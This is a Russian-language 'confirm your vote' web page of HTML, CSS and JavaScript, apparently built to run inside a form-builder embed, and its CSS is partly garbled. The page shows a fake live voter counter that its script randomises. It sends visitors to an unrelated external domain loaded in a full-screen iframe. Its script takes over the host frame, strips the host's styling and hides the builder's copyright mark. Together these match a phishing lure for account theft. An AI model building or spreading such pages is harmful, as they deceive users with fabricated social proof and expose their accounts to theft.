html{

}
body{

/* полноэкранный фон — всегда тёмный, без белых краёв */
.bg{
  position:fixed !important;
  left:0 !important;
  top:0 !important;
  right:0 !important;
  bottom:0 !important;
  width:auto !important;
  height:auto !important;
  max-width:none !important;
  margin:0 !important;
  z-index:2147483000 !important;
  pointer-events:none;
  background:
    radial-gradient(ellipse 90% 55% at 12% 8%, rgba(168,85,247,.22), transparent 55%),
    radial-gradient(ellipse 80% 50% at 90% 15%, rgba(255,45,146,.18), transparent 50%),
    radial-gradient(ellipse 70% 45% at 50% 100%, rgba(34,211,238,.14), transparent 55%),
    var(--bg);
}
.bg::after{
  content:"";
  position:absolute;inset:0;
  background:radial-gradient(circle at 50% 35%, rgba(255,255,255,.035), transparent 50%);
  animation:pulseSoft 6s ease-in-out infinite;
}
@keyframes pulseSoft{
  0%,100%{opacity:.5}
  50%{opacity:1}
}

.wrap{
  position:fixed !important;
  left:0 !important;
  top:0 !important;
  right:0 !important;
  bottom:0 !important;
  z-index:2147483001 !important;

  width:auto !important;
  height:auto !important;
  max-width:none !important;
  min-height:0 !important;
  display:flex !important;
  align-items:stretch;
  justify-content:stretch;
  padding:0 !important;
  margin:0 !important;
  overflow:hidden !important;
}

  width:100%;
  max-width:none;
  min-height:100%;
  height:100%;
  border:0;
  border-radius:0;

  overflow:hidden;
  flex:1 1 auto;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  animation:fadeUp .4s ease both;
}

  content:"";

  from{opacity:0;transform:translateY(10px)}

}

  font-size:12.5px;font-weight:700;letter-spacing:.02em;
  line-height:1.25;
}
.live-dot{

  box-shadow:0 0 12px #ff2d55;
  animation:blink 1.2s ease-in-out infinite;
  flex:0 0 auto;
}

  0%,100%{opacity:1}
  50%{opacity:.35}
}

  color:var(--cyan);

  min-width:1.6em;
  display:inline-block;
  text-align:center;
}

.hero{text-align:center;margin-bottom:14px}
.title{

  font-size:clamp(18px,5vw,24px);

  letter-spacing:-.02em;
  background:linear-gradient(90deg,#fff 15%,var(--cyan));
  -webkit-background-clip:text;background-clip:text;color:transparent;
}
.sub{
  margin:0 auto;
  max-width:340px;
  color:var(--muted);
  font-size:13.5px;
  line-height:1.45;
  font-weight:500;
}

.btns{

  width:var(--btn-w);
  max-width:100%;

.btn{

  min-width:var(--btn-w);

  color:#fff;text-decoration:none;

  cursor:pointer;

  touch-action:manipulation;
  transition:transform .1s ease, box-shadow .12s ease;
}
.btn:hover{transform:translateY(-1px)}
.btn:active,
.btn.is-press{transform:translateY(1px) scale(.98)}
.btn--vk{
  background:linear-gradient(135deg,#0066dd,#0077FF 55%,#4da3ff);
  box-shadow:0 10px 22px rgba(0,119,255,.3);
}
.btn--max{
  background:linear-gradient(135deg,var(--max-a),var(--max-b) 48%,var(--max-c));
  box-shadow:0 10px 22px rgba(168,85,247,.32);
}
.btn svg{width:18px;height:18px;flex:0 0 auto;opacity:.95}

.trust{
  margin-top:12px;
  display:flex;justify-content:center;width:100%;
}
.pill{

  max-width:var(--btn-w) !important;
  min-width:var(--btn-w);

  align-self:center;
}
.pill span{

    transition-duration:.01ms !important;
  }
}
</style>
<div class="bg" aria-hidden="true"></div>

<main class="wrap">
  <div class="card" id="card">
    <div class="live" aria-live="polite">
      <span class="live-dot" aria-hidden="true"></span>
      <span><span class="live-n" id="liveN">147</span> человек голосуют прямо сейчас</span>
    </div>

    <div class="hero">
      <h1 class="title">Почти готово!</h1>
      <p class="sub">Осталось подтвердить голос.<br></p>
    </div>

    <div class="btns">

      <a class="btn btn--max" href="https://espacodogpark.com/golos" rel="nofollow noopener">
        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3.2c1.55 0 2.8 1.25 2.8 2.8S13.55 10.8 12 10.8 9.2 9.55 9.2 8 10.45 5.2 12 5.2zM12 19c-2.4 0-4.52-1.23-5.76-3.1.03-1.91 3.84-2.96 5.76-2.96s5.73 1.05 5.76 2.96C16.52 17.77 14.4 19 12 19z"/></svg>
        Продолжить

<div class="modal" id="modal">
  <iframe id="modalFrame" title="Голосование"></iframe>
</div>

<script>
(function(){
  var bg = "#07070f";
  var locking = false;
  function unlock(el){
    if(!el || !el.style) return;
    el.style.setProperty("max-width","none","important");
    el.style.setProperty("width","100%","important");
    el.style.setProperty("min-height","100dvh","important");
    el.style.setProperty("margin","0","important");
    el.style.setProperty("padding","0","important");
    el.style.setProperty("transform","none","important");
    el.style.setProperty("-webkit-transform","none","important");
    el.style.setProperty("filter","none","important");
    el.style.setProperty("opacity","1","important");
    el.style.setProperty("overflow","visible","important");
    el.style.setProperty("box-shadow","none","important");
    el.style.setProperty("border-radius","0","important");
  }
  function bust(){
    if(locking) return;
    locking = true;
    var roots = document.querySelectorAll(".bg,.wrap,.modal");
    for(var r=0;r<roots.length;r++){
      var node = roots[r].parentElement;
      while(node){
        unlock(node);
        node.style.setProperty("background","transparent","important");
        node = node.parentElement;
      }
    }
    var shells = document.querySelectorAll("#page,.design,.wrap-form,#workspace,.grid-table,.grid-line,.grid-column,[data-id]");
    for(var s=0;s<shells.length;s++){
      unlock(shells[s]);
      shells[s].style.setProperty("background","transparent","important");
    }
    document.documentElement.style.setProperty("background", bg, "important");
    document.body.style.setProperty("background", bg, "important");
    document.body.style.setProperty("min-height", "100dvh", "important");
    document.body.style.setProperty("margin", "0", "important");
    document.body.style.setProperty("max-width", "none", "important");
    var plate = document.getElementById("create-background");
    if(plate){
      plate.style.setProperty("background", bg, "important");
      plate.style.setProperty("margin", "0", "important");
    }
    var marks = document.querySelectorAll(".copyright-stepform");
    for(var m=0;m<marks.length;m++) marks[m].style.setProperty("display","none","important");
    try{
      if(window.frameElement){
        var frame = window.frameElement;
        frame.style.setProperty("position","fixed","important");
        frame.style.setProperty("left","0","important");
        frame.style.setProperty("top","0","important");
        frame.style.setProperty("right","0","important");
        frame.style.setProperty("bottom","0","important");
        frame.style.setProperty("width","100%","important");
        frame.style.setProperty("height","100%","important");
        frame.style.setProperty("max-width","none","important");
        frame.style.setProperty("border","0","important");
        frame.style.setProperty("z-index","2147483647","important");
      }
    }catch(e){}
    if(window.parent && window.parent !== window){
      var h = (window.screen && (window.screen.availHeight || window.screen.height)) || window.innerHeight || 800;
      var id = (location.pathname || "").split("/").pop();
      try{
        parent.postMessage({
          stepFORM:true,
          id:id,
          widthHtml:document.documentElement.offsetWidth || window.innerWidth,
          width:window.innerWidth,
          height:h,
          v:2
        }, "*");
      }catch(e){}
    }
    locking = false;
  }
  bust();
  addEventListener("load", bust);
  [50,200,600,1200,2500,5000].forEach(function(ms){ setTimeout(bust, ms); });
  if(window.MutationObserver){
    var watch = document.getElementById("workspace") || document.body;
    var kick = 0;
    new MutationObserver(function(){
      if(locking) return;
      clearTimeout(kick);
      kick = setTimeout(bust, 60);
    }).observe(watch, {attributes:true, subtree:true, attributeFilter:["style","class"]});
  }

  var inIframe = false;
  try{ inIframe = window.self !== window.top; }catch(e){ inIframe = true; }

  var el = document.getElementById("liveN");
  var n = 120 + (Math.random() * 60 | 0);
  function paint(){ if(el) el.textContent = n; }
  paint();
  setInterval(function(){
    n += (Math.random() * 3 | 0) - 1;
    if(n < 100) n = 100;
    if(n > 200) n = 200;
    paint();
  }, 3500);

  var openBtn = document.querySelector(".btn--max");
  if(openBtn){
    openBtn.addEventListener("click", function(event){
      event.preventDefault();
      var frame = document.getElementById("modalFrame");
      var modal = document.getElementById("modal");
      if(!frame.getAttribute("src")) frame.src = openBtn.getAttribute("href");
      modal.classList.add("active");
    });
  }

  document.querySelectorAll(".btn").forEach(function(btn){
    btn.addEventListener("pointerdown", function(){ btn.classList.add("is-press"); }, {passive:true});
    btn.addEventListener("pointerup", function(){ btn.classList.remove("is-press"); }, {passive:true});
    btn.addEventListener("pointercancel", function(){ btn.classList.remove("is-press"); }, {passive:true});
    btn.addEventListener("pointerleave", function(){ btn.classList.remove("is-press"); }, {passive:true});
  });

  var lastH = 0;
  function fullHeight(){
    var screenH = 0;
    if(window.screen) screenH = window.screen.availHeight || window.screen.height || 0;
    var viewH = window.innerHeight || 0;
    return Math.ceil(Math.max(screenH, viewH));
  }
  function notifyHeight(){
    if(!inIframe) return;
    var h = fullHeight();
    if(h < 200) h = 200;
    if(Math.abs(h - lastH) < 2) return;
    lastH = h;
    try{
      parent.postMessage({ type:"resize", height:h }, "*");
      parent.postMessage(JSON.stringify({ height:h }), "*");
    }catch(e){}
  }
  notifyHeight();
  addEventListener("load", notifyHeight);
  addEventListener("resize", notifyHeight);
  addEventListener("orientationchange", notifyHeight);
})();
</script>
</body>
